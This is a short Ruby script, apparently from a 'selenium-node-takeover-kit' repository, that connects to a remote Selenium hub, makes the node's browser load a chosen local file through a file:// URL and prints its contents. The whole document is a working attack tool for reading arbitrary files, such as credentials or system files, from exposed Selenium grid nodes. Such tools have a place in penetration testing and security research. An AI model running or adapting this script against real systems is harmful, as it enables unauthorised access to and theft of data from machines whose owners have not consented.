#!/usr/bin/env ruby
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_cat.rb
# 
# A quick and light version of selenium_node_download.py that doesnt handle binary files.
# Simply creates a connection and loads the remote file with the browser.

require 'selenium-webdriver'
require 'optparse'

options = {}
OptionParser.new do |opts|
  opts.banner = 'Usage: example.rb [options]'
  opts.on('-hURL', '--hubURL', 'Selenium Hub URL') do |h|
    options[:hub] = h
  end
  opts.on('-rFILE', '--remoteFILE', 'The destination of the uploaded files.') do |r|
    options[:remote] = r
  end
  opts.on('-bBROWSER', '--browserBROWSER', 'The Browser to use.') do |r|
    options[:browser] = r
  end
  opts.on('--help', 'Prints this help') do
    puts opts
    exit
  end
end.parse!

hub_url = options[:hub]
remote_file = options[:remote]
browser = options[:browser] ? options[:browser] : 'firefox'

# Nothing special about the driver here. Probably would work on any browser
driver = Selenium::WebDriver.for :remote, :url => hub_url, :desired_capabilities => { :browserName => browser }

# Just get the local file and print it
driver.get('file://%s' % [remote_file])
print(driver.page_source)
driver.quit

exit
